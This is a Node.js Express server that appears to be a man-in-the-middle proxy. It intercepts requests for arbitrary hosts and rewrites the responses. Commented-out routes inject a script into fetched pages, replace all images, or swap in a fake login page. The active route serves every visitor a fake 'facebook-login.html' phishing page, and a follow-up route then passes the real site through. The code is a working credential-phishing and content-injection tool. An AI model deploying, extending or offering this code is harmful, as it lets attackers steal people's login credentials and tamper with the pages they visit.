const express = require('express');
const app     = express();
const path    = require('path');
const fetch   = require('node-fetch');
const cheerio = require('cheerio')
const request = require('request');

app.set('port', (process.env.PORT || 8080));

// Status
app.get('/ping', (req, res) => {
  res.status(200).send({ status: "ok" });
});


/**** Code Injection ****/
// app.get('/', async (req, response) => {
//   const SCRIPT_TO_ADD = 'alert("code added!");';

//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
//   console.log("Client request received", url)

//   const fetchedResponse = await fetch(url);
//   const html = await fetchedResponse.text();

//   console.log("Injecting script");
//   const loadedHtml = cheerio.load(html);
//   const scriptNode = `<script>${SCRIPT_TO_ADD}</script>`;
//   loadedHtml('body').append(scriptNode);

//   response.send(loadedHtml.html());
// });



/**** Image Injection  ****/
// app.get('/', async (req, response) => {
//   // const IMAGE_TO_REPLACE = 'https://media.lmneuquen.com/adjuntos/195/imagenes/003/563/0003563137.jpg';
//   const IMAGE_TO_REPLACE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYUR6eER5dHC5V-uc9uat18eX-rXlmvAkvqQZ6IL7BjNChuXLg";

//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
//   console.log("Client request received", url)

//   const fetchedResponse = await fetch(url);
//   const html = await fetchedResponse.text();

//   console.log("Replacing image");
//   const regex = new RegExp('<img (.+?)src="[^"]+"', 'gi');
//   const replaced = html.replace(regex, `<img src="${IMAGE_TO_REPLACE}"`);

//   response.send(replaced);
// });



/**** HTML Login Injection ****/
// app.get('/', async (req, response) => {
//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
//   console.log("Client request received", url)

//   console.log("Replacing whole html");
//   response.sendFile(path.join(__dirname+'/login.html'));
// });



/*** Facebook Login HTML Injection  ***/
app.get('/', async (req, res, next) => {
  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
  console.log("Client request received", url)

  console.log("Sending Facebook html");
  res.sendFile(path.join(__dirname+'/facebook-login.html'));

});

app.get('/login.html', async (req, res) => {
  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
  console.log("Login", url)

  const regex = new RegExp('login.html.*', 'g');
  const realUrl = url.replace(regex, '');
  console.log("Real Url", realUrl)

  request({ url: realUrl }).pipe(res);
});


app.listen(app.get('port'), function() {
  console.log('Node app is running on port', app.get('port'));
});
